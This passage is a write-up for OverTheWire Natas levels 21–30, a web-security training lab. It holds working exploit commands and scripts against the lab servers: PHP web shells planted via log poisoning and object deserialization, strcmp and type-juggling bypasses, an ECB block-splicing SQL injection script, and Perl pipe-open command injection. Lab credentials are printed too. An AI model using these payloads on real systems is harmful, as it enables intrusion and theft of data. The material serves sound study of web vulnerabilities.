└─$ curl 'http://natas21.natas.labs.overthewire.org/' -u 'natas21:BPhv63cKE1lkQl04cE5CuFTzXe15NfiH' -b 'PHPSESSID=4ajo0ql65lip3qqg6qoh2eoi5l'
...
You are an admin. The credentials for the next level are:<br><pre>Username: natas22
Password: d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz</pre>
...
```
## Natas 22 -- Don't Follow Redirect

```php
<?php
session_start();

if (array_key_exists("revelio", $_GET)) {
    // only admins can reveal the password
    if (!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
        header("Location: /");
    }
}
?>

<?php
if (array_key_exists("revelio", $_GET)) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas23\n";
    print "Password: <censored></pre>";
}
?>
```

```bash
└─$ curl 'http://natas22.natas.labs.overthewire.org/?revelio=1' -u 'natas22:d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz' -i
HTTP/1.1 302 Found
Date: Sat, 24 Aug 2024 17:40:11 GMT
Server: Apache/2.4.58 (Ubuntu)
Location: /
...
You are an admin. The credentials for the next level are:<br><pre>Username: natas23
Password: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs</pre>
...
```
## Natas 23 -- String/Integer Comparison 

![Natas-15.png](/assets/ctf/overthewire/natas-15.png)

```php
<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas24 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?> 
```

The submitted password should contain `iloveyou` and should be greater then `10` (the value, not length).

```bash
└─$ curl 'http://natas23.natas.labs.overthewire.org/' -u 'natas23:dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs' -d 'passwd=99iloveyou'
...
Username: natas24 Password: MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd</pre>
...
```
## Natas 24 -- strcmp bypass

```php
<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(!strcmp($_REQUEST["passwd"],"<censored>")){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas25 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>  
```

[PHP strcmp Bypass – Introduction](https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016)

```bash
└─$ curl 'http://natas24.natas.labs.overthewire.org/' -u 'natas24:MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd' -d 'passwd[]=""'
...
<b>Warning</b>:  strcmp() expects parameter 1 to be string, array given in <b>/var/www/natas/natas24/index.php</b> on line <b>23</b><br />
<br>The credentials for the next level are:<br><pre>Username: natas25 Password: ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws</pre>
...
```
## Natas 25 -- Log poison -> LFI -> RCE

![Natas-16.png](/assets/ctf/overthewire/natas-16.png)

```php
<?php
    // cheers and <3 to malvina
    // - morla

    function setLanguage(){
        /* language setup */
        if(array_key_exists("lang",$_REQUEST))
            if(safeinclude("language/" . $_REQUEST["lang"] ))
                return 1;
        safeinclude("language/en"); 
    }
    
    function safeinclude($filename){
        // check for directory traversal
        if(strstr($filename,"../")){
            logRequest("Directory traversal attempt! fixing request.");
            $filename=str_replace("../","",$filename);
        }
        // dont let ppl steal our passwords
        if(strstr($filename,"natas_webpass")){
            logRequest("Illegal file access detected! Aborting!");
            exit(-1);
        }
        // add more checks...

        if (file_exists($filename)) { 
            include($filename);
            return 1;
        }
        return 0;
    }
    
    function listFiles($path){
        $listoffiles=array();
        if ($handle = opendir($path))
            while (false !== ($file = readdir($handle)))
                if ($file != "." && $file != "..")
                    $listoffiles[]=$file;
        
        closedir($handle);
        return $listoffiles;
    } 
    
    function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n"; 
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
?>
```

```bash
└─$ curl 'http://natas25.natas.labs.overthewire.org/?lang=natas_webpass' -u 'natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws' -isA '<?PHP echo system($_REQUEST[0]); ?>' | grep -iE 'Cookie|Illegal'
Set-Cookie: PHPSESSID=ka83ieencaoo42jn2hni0atkk0; path=/; HttpOnly
└─$ SESSID=ka83ieencaoo42jn2hni0atkk0
└─$ curl "http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//....//....//var/www/natas/natas25/logs/natas25_$SESSID.log&0=id" -u 'natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws' -b "PHPSESSID=$SESSID"
...
[24.08.2024 18::11:18] uid=30025(natas25) gid=30025(natas25) groups=30025(natas25),50000(phpsess)
uid=30025(natas25) gid=30025(natas25) groups=30025(natas25),50000(phpsess) "Illegal file access detected! Aborting!"
[24.08.2024 18::13:41] curl/8.8.0 "Directory traversal attempt! fixing request."
...
└─$ curl "http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//....//....//var/www/natas/natas25/logs/natas25_$SESSID.log&0=cat+/etc/natas_webpass/natas26" -u 'natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws' -b "PHPSESSID=$SESSID"
...
[24.08.2024 18::11:18] cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE
cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE "Illegal file access detected! Aborting!"
[24.08.2024 18::13:41] curl/8.8.0 "Directory traversal attempt! fixing request."
[24.08.2024 18::14:23] curl/8.8.0 "Directory traversal attempt! fixing request."
...
```
## Natas 26 -- Deserialization Attack

![Natas-17.png](/assets/ctf/overthewire/natas-17.png)

```php
<?php
// sry, this is ugly as hell.
// cheers kaliman ;)
// - morla

class Logger {
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct($file) {
        // initialise variables
        $this->initMsg = "#--session started--#\n";
        $this->exitMsg = "#--session end--#\n";
        $this->logFile = "/tmp/natas26_" . $file . ".log";

        // write initial message
        $fd = fopen($this->logFile, "a+");
        fwrite($fd, $this->initMsg);
        fclose($fd);
    }

    function log($msg) {
        $fd = fopen($this->logFile, "a+");
        fwrite($fd, $msg . "\n");
        fclose($fd);
    }

    function __destruct() {
        // write exit message
        $fd = fopen($this->logFile, "a+");
        fwrite($fd, $this->exitMsg);
        fclose($fd);
    }
}

function showImage($filename) {
    if (file_exists($filename))
        echo "<img src=\"$filename\">";
}

function drawImage($filename) {
    $img = imagecreatetruecolor(400, 300);
    drawFromUserdata($img);
    imagepng($img, $filename);
    imagedestroy($img);
}

function drawFromUserdata($img) {
    if (
        array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
        array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)
    ) {
        $color = imagecolorallocate($img, 0xff, 0x12, 0x1c);
        imageline(
            $img,
            $_GET["x1"],
            $_GET["y1"],
            $_GET["x2"],
            $_GET["y2"],
            $color
        );
    }

    if (array_key_exists("drawing", $_COOKIE)) {
        $drawing = unserialize(base64_decode($_COOKIE["drawing"]));
        if ($drawing)
            foreach ($drawing as $object)
                if (
                    array_key_exists("x1", $object) &&
                    array_key_exists("y1", $object) &&
                    array_key_exists("x2", $object) &&
                    array_key_exists("y2", $object)
                ) {
                    $color = imagecolorallocate($img, 0xff, 0x12, 0x1c);
                    imageline(
                        $img,
                        $object["x1"],
                        $object["y1"],
                        $object["x2"],
                        $object["y2"],
                        $color
                    );
                }
    }
}

function storeData() {
    $new_object = array();

    if (
        array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
        array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)
    ) {
        $new_object["x1"] = $_GET["x1"];
        $new_object["y1"] = $_GET["y1"];
        $new_object["x2"] = $_GET["x2"];
        $new_object["y2"] = $_GET["y2"];
    }

    if (array_key_exists("drawing", $_COOKIE)) {
        $drawing = unserialize(base64_decode($_COOKIE["drawing"]));
    } else {
        // create new array
        $drawing = array();
    }

    $drawing[] = $new_object;
    setcookie("drawing", base64_encode(serialize($drawing)));
}
?>

<?php
session_start();

if (
    array_key_exists("drawing", $_COOKIE) ||
    (array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
        array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET))
) {
    $imgfile = "img/natas26_" . session_id() . ".png";
    drawImage($imgfile);
    showImage($imgfile);
    storeData();
}
?>
```

Logger class is just sitting there and no instance is spawned, which is odd. Cookies are desterilized from base64 decoded data and PHP has a known vulnerability in that field:
[PayloadsAllTheThings / Insecure Deserialization / PHP Deserialization](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/PHP.md#general-concept)

```php
<?php

class Logger {
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct($initMsg, $exitMsg, $logFile){
        $this->initMsg=$initMsg;
        $this->exitMsg=$exitMsg;
        $this->logFile=$logFile;
    }
}

$logger = new Logger(
    '<?PHP echo system($_REQUEST[0]); ?>',
    '<?PHP echo system($_REQUEST[0]); ?>',
    'img/t.php'
);

echo base64_encode(serialize($logger));

# Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czo5OiJpbWcvdC5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czozNToiPD9QSFAgZWNobyBzeXN0ZW0oJF9SRVFVRVNUWzBdKTsgPz4iO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czozNToiPD9QSFAgZWNobyBzeXN0ZW0oJF9SRVFVRVNUWzBdKTsgPz4iO30= 
```

![Natas-18.png](/assets/ctf/overthewire/natas-18.png)

```bash
└─$ curl 'http://natas26.natas.labs.overthewire.org/img/t.php?0=id' -u 'natas26:cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE'
...
uid=30026(natas26) gid=30026(natas26) groups=30026(natas26),50000(phpsess)                                                                                                                                        
└─$ curl 'http://natas26.natas.labs.overthewire.org/img/t.php?0=cat+/etc/natas_webpass/natas27' -u 'natas26:cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE'
...
u3RRffXjysjgwFU6b9xa23i6prmUsYne 
```
## Natas 27 -- Whitespace Injection

![Natas-19.png](/assets/ctf/overthewire/natas-19.png)

```php
<?php
// morla / 10111
// database gets cleared every 5 min

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

function checkCredentials($link, $usr, $pass) {
    $user = mysqli_real_escape_string($link, $usr);
    $password = mysqli_real_escape_string($link, $pass);

    $query = "SELECT username from users where username='$user' and password='$password' ";
    $res = mysqli_query($link, $query);
    if (mysqli_num_rows($res) > 0) {
        return True;
    }
    return False;
}

function validUser($link, $usr) {
    $user = mysqli_real_escape_string($link, $usr);

    $query = "SELECT * from users where username='$user'";
    $res = mysqli_query($link, $query);
    if ($res) {
        if (mysqli_num_rows($res) > 0) {
            return True;
        }
    }
    return False;
}


function dumpData($link, $usr) {
    $user = mysqli_real_escape_string($link, trim($usr));

    $query = "SELECT * from users where username='$user'";
    $res = mysqli_query($link, $query);
    if ($res) {
        if (mysqli_num_rows($res) > 0) {
            while ($row = mysqli_fetch_assoc($res)) {
                // thanks to Gobo for reporting this bug!
                // return print_r($row);
                return print_r($row, true);
            }
        }
    }
    return False;
}

function createUser($link, $usr, $pass) {
    if ($usr != trim($usr)) {
        echo "Go away hacker";
        return False;
    }
    $user = mysqli_real_escape_string($link, substr($usr, 0, 64));
    $password = mysqli_real_escape_string($link, substr($pass, 0, 64));

    $query = "INSERT INTO users (username,password) values ('$user','$password')";
    $res = mysqli_query($link, $query);
    if (mysqli_affected_rows($link) > 0) {
        return True;
    }
    return False;
}

if (array_key_exists("username", $_REQUEST) and array_key_exists("password", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas27', '<censored>');
    mysqli_select_db($link, 'natas27');

    if (validUser($link, $_REQUEST["username"])) {
        //user exists, check creds
        if (checkCredentials($link, $_REQUEST["username"], $_REQUEST["password"])) {
            echo "Welcome " . htmlentities($_REQUEST["username"]) . "!<br>";
            echo "Here is your data:<br>";
            $data = dumpData($link, $_REQUEST["username"]);
            print htmlentities($data);
        } else {
            echo "Wrong password for user: " . htmlentities($_REQUEST["username"]) . "<br>";
        }
    } else {
        //user doesn't exist
        if (createUser($link, $_REQUEST["username"], $_REQUEST["password"])) {
            echo "User " . htmlentities($_REQUEST["username"]) . " was created!";
        }
    }

    mysqli_close($link);
}
```

`createUser` restricts the creation of user which has spaces, but later it cuts down length to 64. We can create username like `natas28<SPACES><ANY_CHAR>`, essentially a sandwich that will make spaces bypassable. But why do we need spaces? `dumpData` function takes our username, trims it and then performs query (`admin    ` -> `admin`).

```bash
└─$ curl http://natas27.natas.labs.overthewire.org/ -u 'natas27:u3RRffXjysjgwFU6b9xa23i6prmUsYne' -d "username=natas28$(perl -e 'print " "x57')padding&password=letmein"
...
User natas28                                                         padding was created!<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>

...
└─$ curl http://natas27.natas.labs.overthewire.org/ -u 'natas27:u3RRffXjysjgwFU6b9xa23i6prmUsYne' -d "username=natas28$(perl -e 'print " "x57')&password=letmein"
...
<div id="content">
Welcome natas28                                                         !<br>Here is your data:<br>Array
(
    [username] =&gt; natas28
    [password] =&gt; 1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj
)
...
```
## Natas 28 -- PKCS#7

![Natas-20.png](/assets/ctf/overthewire/natas-20.png)

```bash
└─$ curl http://natas28.natas.labs.overthewire.org/ -u 'natas28:1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj' -d 'query=a' -i -L
HTTP/1.1 302 Found
Date: Sun, 25 Aug 2024 09:11:54 GMT
Server: Apache/2.4.58 (Ubuntu)
Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKriAqPE2%2B%2BuYlniRMkobB1vfoQVOxoUVz5bypVRFkZR5BPSyq%2FLC12hqpypTFRyXA%3D
Content-Length: 920
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Sun, 25 Aug 2024 09:11:54 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1277
Content-Type: text/html; charset=UTF-8
...
<h2> Whack Computer Joke Database</h2><ul><li>Q: how many programmers does it take to change a light bulb?<br />
A: none, that's a hardware problem.</li><li>I've got a really good UDP joke to tell you, but I don't know if you'll get it</li><li>Q: Why do programmers always mix up Halloween and Christmas?<br />
A: Because Oct 31 == Dec 25!</li></ul>
...
```

URL Decode the `search.php` query param
```http
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKriAqPE2++uYlniRMkobB1vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
```

If we remove few characters and send request error gets triggered:

![Natas-21.png](/assets/ctf/overthewire/natas-21.png)

Do some fuzzing to analyze the encryption method:
```python
from requests.auth import HTTPBasicAuth
from urllib.parse import unquote
import requests
import string

AUTH = HTTPBasicAuth(username='natas28', password='1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj')
URL = f'http://{AUTH.username}.natas.labs.overthewire.org/'
CHARSET = string.ascii_lowercase

with requests.Session() as session:
    session.auth = AUTH

    for char in CHARSET:
        resp = session.post(URL, data={'query': char})
        query = unquote(resp.url.split('=', 1)[1])
        print(f'[{char}] len={len(query)} {query=}')
```

The repeating patters have been separated by space, as it seems only middle part gets changed. Probably because query is like `SELECT field FROM table WHERE field LIKE '<INPUT>%'` where only our input changes the query.
```bash
[a] len=108 query='G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP KriAqPE2++uYlniRMkobB1 vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA='
[b] len=108 query='G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP IYiwNnSJY7KHJGU+XjuMzV vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA='
[c] len=108 query='G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP KEMZKNASy09t5ooTNAbaX0 vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA='
[d] len=108 query='G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP KnMw6aSOWjayIcOCUAu7bV vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA='
[e] len=108 query='G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP IeoxGWFgXHXykQlH86OpiM vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA='
[f] len=108 query='G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP KX9Nbu3XXL5PIaYqiW14GS vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA='
[g] len=108 query='G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP LV4wF7G0i3DftMhPsAyZVq vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA='
[h] len=108 query='G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP IJJW40OKGV9h7fJBqf28f9 vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA='
[i] len=108 query='G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP LMEPlGOfuQ7a1fFtCB5a1X vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA='
[j] len=108 query='G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP ICgQ0oynl6FWbVHY/8dJkI vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA='
[k] len=108 query='G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP LnuAD+NGYcU1yTMgoFGDHH vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA='
[l] len=108 query='G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP IskS5tRSHzosjTBciCi/8V vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA='
[m] len=108 query='G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP JTwbPiFdKuTtoify+YlBFL vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA='
[n] len=108 query='G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP KvKlZ1HHFG9tUyBWOMONOR vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA='
[o] len=108 query='G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP IPdJbPB4AWVinSFPLRB1eY vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA='
[p] len=108 query='G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP KD30n5dTLLZ3c/Rs9/bQww vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA='
[q] len=108 query='G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP Kghh12LRBJ55334nG5Lgfx vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA='
[r] len=108 query='G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP Kef8vfXgzqiOnKBXb2kd2c vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA='
[s] len=108 query='G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP I+jVOKpzBAHVGo0XIzCijx vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA='
[t] len=108 query='G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP KLbhtgC4p7C+91shiGBL15 vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA='
[u] len=108 query='G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP IRwoUdFyCT68E7RwSyaxRS vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA='
[v] len=108 query='G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP Iae8xMT+8hwEi33FOpyUlm vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA='
[w] len=108 query='G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP KlwoXvDTqKtYfcUSRUbdOS vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA='
[x] len=108 query='G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP JXwBmXBeBRhwrvq1HTCwh/ vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA='
[y] len=108 query='G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP L7EnsTc1X3234z1DMqyjsM vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA='
[z] len=108 query='G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP JDB5EyzqNqQNuIYdASJqV6 vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA='
```

Fuzzing with `{'query': 'AAAAAAAAAA' + char}` reveals mostly same results and the repeating pattern is a clear indicator that ECB encryption.

_**Electronic Code Book (ECB)** is a simple mode of operation with a block cipher that's mostly used with symmetric key encryption._ [src](https://www.techtarget.com/searchsecurity/definition/Electronic-Code-Book)

```bash
[a] len=108 query='G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy tO2gh9PAvqK+3BthQLni68 qM9OYQkTq645oGdhkgSlo='
[b] len=108 query='G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy kz5gzNGEeDHOfrljhA+kQs qM9OYQkTq645oGdhkgSlo='
[c] len=108 query='G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmy p8uKaWOk/L1EzPG9q762C8 qM9OYQkTq645oGdhkgSlo='
```

Search for 
```python
from requests.auth import HTTPBasicAuth
from urllib.parse import unquote
from base64 import b64decode as bd
import requests

AUTH = HTTPBasicAuth(username='natas28', password='1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj')
URL = f'http://{AUTH.username}.natas.labs.overthewire.org/'

with requests.Session() as session:
    session.auth = AUTH

    prev_len = 0
    for i in range(32):
        resp = session.post(URL, data={'query': 'A' * i})
        query = unquote(resp.url.split('=', 1)[1])
        query_hex = bd(query).hex()
        query_hex_len = len(query_hex)
        if prev_len != query_hex_len:
            print(f'[{i}] len={query_hex_len} query={query_hex}')
        prev_len = query_hex_len
```

```bash
[0] len=160 query=1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2e87ff60c99ad72ccbd947e3417a90128a77e8ed1aabe0b5d05c4ffe6ac1423ab478eb1a1fe261a2c6c15061109b3feda
[13] len=192 query=1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf25f22a727f625419a466f9af53891f9b2c6476e419619d387f457731225f15fe16223a14d9c4291b98775b03fbc73d4edd8ae51d7da71b2b083d919a0d7b88b98
[29] len=224 query=1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf25f22a727f625419a466f9af53891f9b2f633e6b05f866226b863817112b1c92bc6476e419619d387f457731225f15fe16223a14d9c4291b98775b03fbc73d4edd8ae51d7da71b2b083d919a0d7b88b98
```

Each block length is 16
```python
>>> (224 - 192) / 2
16.0
>>> (192 - 160) / 2
16.0
```

The first and last 2 blocks seems to be always repeating and middle part is always changing. As we mentioned we can guess partial query, for the last part it's probably like `ORDER BY rand() LIMIT 3` because on successful result we get only 3 jokes, but different jokes on each request.
```bash
[0] len=160 query=['1be82511a7ba5bfd578c0eef466db59c', 'dc84728fdcf89d93751d10a7c75c8cf2', 'e87ff60c99ad72ccbd947e3417a90128', 'a77e8ed1aabe0b5d05c4ffe6ac1423ab', '478eb1a1fe261a2c6c15061109b3feda']
[16] len=192 query=['1be82511a7ba5bfd578c0eef466db59c', 'dc84728fdcf89d93751d10a7c75c8cf2', '5f22a727f625419a466f9af53891f9b2', 'e3df361c6393619ac7b3e9d097b111ae', 'a77e8ed1aabe0b5d05c4ffe6ac1423ab', '478eb1a1fe261a2c6c15061109b3feda']
[32] len=224 query=['1be82511a7ba5bfd578c0eef466db59c', 'dc84728fdcf89d93751d10a7c75c8cf2', '5f22a727f625419a466f9af53891f9b2', 'f633e6b05f866226b863817112b1c92b', 'e3df361c6393619ac7b3e9d097b111ae', 'a77e8ed1aabe0b5d05c4ffe6ac1423ab', '478eb1a1fe261a2c6c15061109b3feda']
```

Also notice that `5f22a727f625419a466f9af53891f9b2` is repeated, it's result of 13 "A"s

Anyway, why the fuck are we discussing encryption? Well this would have been too easy if we could just insert a quote and then malicious SQL, right? The quotes and other special characters are escaped, most probably `addslashes` is used on backend. 
The question is, how do you escape the escape? The encryption! Because of the nature of block cipher we can inject quote, but the new character will be in the next block if we overflow the block and we can rewrite previous block with "good block".

```python
from requests.auth import HTTPBasicAuth
from urllib.parse import unquote
from base64 import b64decode as bd, b64encode as be
from textwrap import wrap
from bs4 import BeautifulSoup as BS
import requests

AUTH = HTTPBasicAuth(username='natas28', password='1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj')
URL = f'http://{AUTH.username}.natas.labs.overthewire.org/'
BLOCK_SIZE = 32 # Times 2 because hex 
REPEAT_SIZE = 9

def decode(url):
    return bd(unquote(url.split('=', 1)[1])).hex()

def encode(hexstr):
    return be(bytes.fromhex(hexstr)).decode()

with requests.Session() as session:
    session.auth = AUTH

    resp = session.post(URL, data={'query': 'A' * REPEAT_SIZE})
    query = decode(resp.url)
    blocks = wrap(query, BLOCK_SIZE)
    good_block = blocks[2] # Third block

    # resp = session.post(URL, data={'query': 'A' * REPEAT_SIZE + "' UNION SELECT @@version; #"})
    resp = session.post(URL, data={'query': 'A' * REPEAT_SIZE + "' UNION SELECT CONCAT(username,0x3A,password) FROM users; #"})
    query = decode(resp.url)
    blocks = wrap(query, BLOCK_SIZE)
    blocks[2] = good_block # Remove `\`
    query = encode(''.join(blocks))

    resp = session.get(URL + '/search.php', params={'query': query})
    output = BS(resp.text, 'html.parser').find('ul').get_text()
    print(output)
```

> **Note**: I thought the repeat size was 12, but it was 9.

```bash
natas29:31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns
```

> Reference used: [Breaking ECB Crypto (No programming) - Natas 28 Walkthrough - Overthewire.org](https://youtu.be/oWmfYgCYmCc)
## Natas 29 -- Perl RCE

![Natas-22.png](/assets/ctf/overthewire/natas-22.png)

[http://natas29.natas.labs.overthewire.org/index.pl?file=perl+underground](http://natas29.natas.labs.overthewire.org/index.pl?file=perl+underground)

The usual LFI doesn't work, but now instead of PHP we are working with Perl. Perl has "*unique*" properties when it comes to file handling, such as if filename ends with `|` after that it's interpreted as shell command and essentially allows RCE. We can also inject Null Byte to block any characters afterwards.

```powershell
➜ curl 'http://natas29.natas.labs.overthewire.org/' -u 'natas29:31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns' -d 'file=|id%00' -s | sls '</html' -Context 0,1000

> </html>
  uid=30029(natas29) gid=30029(natas29) groups=30029(natas29)
➜ curl 'http://natas29.natas.labs.overthewire.org/' -u 'natas29:31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns' -d 'file=|base64 index.pl%00' -s | sls '</html' -Context 0,1000
```

```perl
#!/usr/bin/perl

use CGI qw(: standard);

print << END;
...
HTML
...
END

if (param('file')) {
  $f = param('file');
  if ($f = ~/natas/) {
    print "meeeeeep!<br>";
  } else {
    open(FD, "$f.txt");
    print "<pre>";
    while ( < FD > ) {
      print CGI::escapeHTML($_);
    }
    print "</pre>";
  }
}

print << END; <
...
HTML
...
END
```

`natas` word is blacklisted, but since we are in bash we can use globbing to bypass that. `?` means any single character at that position.

```powershell
➜ curl 'http://natas29.natas.labs.overthewire.org/' -u 'natas29:31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns' -d 'file=|cat /etc/nata?_webpass/nata?30%00' -s | sls '</html' -Context 0,100

> </html>
  WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH
```
## Natas 30 -- Perl quote

![Natas-23.png](/assets/ctf/overthewire/natas-23.png)

```perl
#!/usr/bin/perl
use CGI qw(:standard);
use DBI;
...
if ('POST' eq request_method && param('username') && param('password')){
    my $dbh = DBI->connect( "DBI:mysql:natas30","natas30", "<censored>", {'RaiseError' => 1});
    my $query="Select * FROM users where username =".$dbh->quote(param('username')) . " and password =".$dbh->quote(param('password')); 

    my $sth = $dbh->prepare($query);
    $sth->execute();
    my $ver = $sth->fetch();
    if ($ver){
        print "win!<br>";
        print "here is your result:<br>";
        print @$ver;
    }
    else{
        print "fail :(";
    }
    $sth->finish();
    $dbh->disconnect();
}
...
```

[StackExchange > Security > Is this Perl database connection vulnerable to SQL Injection](https://security.stackexchange.com/a/175793)
[https://metacpan.org/pod/DBI#quote](https://metacpan.org/pod/DBI#quote)
[https://metacpan.org/pod/DBI#type_info_all](https://metacpan.org/pod/DBI#type_info_all)

```bash
